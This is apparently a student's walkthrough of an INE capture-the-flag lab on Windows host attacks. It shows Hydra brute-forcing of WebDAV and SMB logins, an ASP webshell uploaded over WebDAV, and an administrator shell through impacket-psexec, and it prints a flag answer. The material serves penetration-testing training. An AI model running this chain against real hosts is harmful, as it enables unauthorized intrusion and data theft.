# Lab

## Overview

System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

This lab is designed to test your knowledge and skills in performing system/host-based attacks on Windows targets and identifying hidden information on a target machine.

## Tasks

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Useful files:**

```
/usr/share/metasploit-framework/data/wordlists/common_users.txt, 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
/usr/share/webshells/asp/webshell.asp
```

**Flags to Capture:**

- **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
- **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
- **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
- **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

# Tools

The best tools for this lab are:

- Nmap
- Hydra
- Cadaver
- Metasploit Framework


## Walkthrough
##### **Flag 1:** User 'bob' might not have chosen a strong password. Try common passwords. (target1.ine.local) 

First, Let's start with opening `host` file to check number of targets.

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts 
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.10       INE
127.0.0.1 AttackDefense-Kali
10.10.44.2      INE
10.5.31.178    target1.ine.local
10.5.17.164    target2.ine.local
```

So, there are two targets. Let's get started

Scanning the target, we get the following results 

```bash
┌──(root㉿INE)-[~]
└─# nmap -sC -sV -p- -T4 target1.ine.local 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 22:12 IST
Nmap scan report for target1.ine.local (10.5.31.178)
Host is up (0.0024s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=target1.ine.local
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EC2AMAZ-JVD17HK
| Not valid before: 2025-06-16T16:39:36
|_Not valid after:  2025-12-16T16:39:36
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-JVD17HK
|   NetBIOS_Domain_Name: EC2AMAZ-JVD17HK
|   NetBIOS_Computer_Name: EC2AMAZ-JVD17HK
|   DNS_Domain_Name: EC2AMAZ-JVD17HK
|   DNS_Computer_Name: EC2AMAZ-JVD17HK
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-17T16:43:52+00:00
|_ssl-date: 2025-06-17T16:44:00+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-17T16:43:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.55 seconds

```

##### Info About Target

**O/S:** Windows 🪟
**IP:** `10.5.31.178` | target1.ine.local
**Open Ports:**
- Port 80 `Microsoft IIS httpd 10.0`
- Port 445 `SMB`

Scanning for EternalBlue

```bash
┌──(root㉿INE)-[~]
└─# nmap --script=smb-vuln-ms17-010.nse -p445 target1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 22:20 IST
Nmap scan report for target1.ine.local (10.5.31.178)
Host is up (0.0024s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
```

Nothing came up that means target isn't vulnerable to eternalblue

So for the first flag it is said bob hasn't set a strong password and there is a webdav service running on port 80. How did I know this? Well opening up the target ip in browser prompts with this

![[Pasted image 20250617223139.png]]

So, I think There is a webdav service active. Let's verify with `davtest`

```bash
┌──(root㉿INE)-[~]
└─# davtest -url http://target1.ine.local
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://target1.ine.local        Unauthorized. Basic realm="target1.ine.local"
```

Shows Open that means it has webdav running. So let's bruteforce credentials using Hydra for user bob.

```bash
┌──(root㉿INE)-[~]
└─# hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  target1.ine.local http-get /webdav/ 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 22:30:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1010 login tries (l:1/p:1010), ~64 tries per task
[DATA] attacking http-get://target1.ine.local:80/webdav/
[80][http-get] host: target1.ine.local   login: bob   password: password_123321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 22:30:30
```

Got the password for `bob:password_123321`

Let's login in the browser and check.


![[Pasted image 20250617223546.png]]

Got the first flag 

##### **Flag 2:** Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

Let's try to put a asp shell payload using `cadaver`

```bash
┌──(root㉿INE)-[~]
└─# cp /usr/share/webshells/asp/webshell.asp .

┌──(root㉿INE)-[~]
└─# cadaver http://target1.ine.local/webdav/
Authentication required for target1.ine.local on server `target1.ine.local':
Username: bob
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        flag1.txt                             34  Jun 17 22:55
        metasploit120814716.asp           612490  Jun 17 22:58
        metasploit173547275.asp           613981  Jun 17 22:59
        readme.txt                            18  Dec 31 13:20
        test.asp                              61  Dec 31 14:04
        web.config                           168  Dec 31 14:08
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp
 to `/webdav/webshell.asp%0a': Could not open file: No such file or directory
dav:/webdav/> put webshell.asp
Uploading webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> 

```

Let's check if our web shell is successfully uploaded or not.

![[Pasted image 20250617230431.png]]

So, it is uploaded. Let's move forward and execute it

To execute it click on it. Now for our flag. The Flag hint says there is a lot of C: drive has valuable files let's run `dir C:\` to list C drive root.

![[Pasted image 20250617230716.png]]

So, There our next flag is to open it type `type C:\flag2.txt`

![[Pasted image 20250617230801.png]]

##### **Flag 3:** SMB shares might contain hidden files. Check the available shares. (target2.ine.local)

So, Now our target is another machine. Let's scan it first and then move forward

```bash
┌──(root㉿INE)-[~]
└─# nmap -sC -sV -T4 target2.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 23:12 IST
Nmap scan report for target2.ine.local (10.5.23.150)
Host is up (0.0022s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-3SC2DRK
|   NetBIOS_Domain_Name: EC2AMAZ-3SC2DRK
|   NetBIOS_Computer_Name: EC2AMAZ-3SC2DRK
|   DNS_Domain_Name: EC2AMAZ-3SC2DRK
|   DNS_Computer_Name: EC2AMAZ-3SC2DRK
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-17T17:42:13+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-3SC2DRK
| Not valid before: 2025-06-16T17:23:52
|_Not valid after:  2025-12-16T17:23:52
|_ssl-date: 2025-06-17T17:42:22+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: EC2AMAZ-3SC2DRK
|   NetBIOS computer name: EC2AMAZ-3SC2DRK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-17T17:42:17+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-17T17:42:14
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 1s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds

```

Let's try brute forcing credentials for SMB using Hydra and here we got some credentials.

```bash
┌──(root㉿INE)-[~]
└─# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 23:18:06
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 7070 login tries (l:7/p:1010), ~7070 tries per task
[DATA] attacking smb://target2.ine.local:445/
[445][smb] host: target2.ine.local   login: rooty   password: spongebob
[445][smb] host: target2.ine.local   login: demo   password: password1
[445][smb] host: target2.ine.local   login: auditor   password: hellokitty
[445][smb] host: target2.ine.local   login: administrator   password: pineapple
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 23:19:00

```

Let's take interest in `administrator` user and connect to smb share using smbclient tool

```bash
┌──(root㉿INE)-[~]
└─# smbclient //target2.ine.local/C$ -U administrator

Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Sat Nov  7 13:45:59 2020
  Boot                              DHS        0  Wed Sep  9 10:08:52 2020
  bootmgr                          AHSR   408692  Wed Sep  9 10:03:42 2020
  BOOTNXT                           AHS        1  Sat Sep 15 12:42:30 2018
  Documents and Settings          DHSrn        0  Wed Nov 14 21:40:15 2018
  EFI                                 D        0  Wed Nov 14 12:26:18 2018
  flag3.txt                           A       34  Tue Jun 17 22:56:26 2025
  pagefile.sys                      AHS 2013265920  Tue Jun 17 22:53:50 2025
  PerfLogs                            D        0  Wed May 13 23:28:09 2020
  Program Files                      DR        0  Sat Nov  7 13:17:23 2020
  Program Files (x86)                 D        0  Sat Nov  7 13:17:24 2020
  ProgramData                       DHn        0  Wed Jan  1 13:47:15 2025
  Recovery                         DHSn        0  Wed Jan  1 13:54:07 2025
  Shared                              D        0  Tue Dec 31 16:59:14 2024
  System Volume Information         DHS        0  Sat Nov  7 12:06:43 2020
  Users                              DR        0  Wed Jan  1 14:00:24 2025
  Utilities                           D        0  Sat Nov  7 13:19:05 2020
  Windows                             D        0  Tue Jun 17 22:58:52 2025

                7863807 blocks of size 4096. 3645722 blocks available
smb: \> get flag3.txt 
getting file \flag3.txt of size 34 as flag3.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)


```

Got the 3rd flag.

##### **Flag 4:** The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

The hint says to check Desktop. Let's try getting reverse shell using psexec 

```bash
┌──(root㉿INE)-[~]
└─# impacket-psexec administrator:pineapple@target2.ine.local
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on target2.ine.local.....
[*] Found writable share ADMIN$
[*] Uploading file oUyegWSs.exe
[*] Opening SVCManager on target2.ine.local.....
[*] Creating service phVC on target2.ine.local.....
[*] Starting service phVC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd /
 
C:\> 

```

Got a shell, let's check desktop for flag

```bash
┌──(root㉿INE)-[~]
└─# impacket-psexec administrator:pineapple@target2.ine.local
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on target2.ine.local.....
[*] Found writable share ADMIN$
[*] Uploading file oUyegWSs.exe
[*] Opening SVCManager on target2.ine.local.....
[*] Creating service phVC on target2.ine.local.....
[*] Starting service phVC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd /
 
C:\> cd Users
 
C:\Users> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users

01/01/2025  08:30 AM    <DIR>          .
01/01/2025  08:30 AM    <DIR>          ..
01/01/2025  08:30 AM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
11/07/2020  08:15 AM    <DIR>          student
               0 File(s)              0 bytes
               5 Dir(s)  14,932,819,968 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator

01/01/2025  08:30 AM    <DIR>          .
01/01/2025  08:30 AM    <DIR>          ..
01/01/2025  08:30 AM    <DIR>          3D Objects
01/01/2025  08:30 AM    <DIR>          Contacts
01/01/2025  08:30 AM    <DIR>          Desktop
01/01/2025  08:30 AM    <DIR>          Documents
01/01/2025  08:30 AM    <DIR>          Downloads
01/01/2025  08:30 AM    <DIR>          Favorites
01/01/2025  08:30 AM    <DIR>          Links
01/01/2025  08:30 AM    <DIR>          Music
01/01/2025  08:30 AM    <DIR>          Pictures
01/01/2025  08:30 AM    <DIR>          Saved Games
01/01/2025  08:30 AM    <DIR>          Searches
01/01/2025  08:30 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,932,819,968 bytes free

C:\Users\Administrator> cd Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

06/17/2025  05:26 PM    <DIR>          .
06/17/2025  05:26 PM    <DIR>          ..
06/17/2025  05:26 PM                34 flag4.txt
               1 File(s)             34 bytes
               2 Dir(s)  14,932,819,968 bytes free

C:\Users\Administrator\Desktop> type flag4.txt
4694348f0c9f438db2c95a339e7bb583

C:\Users\Administrator\Desktop> 

```

Done !

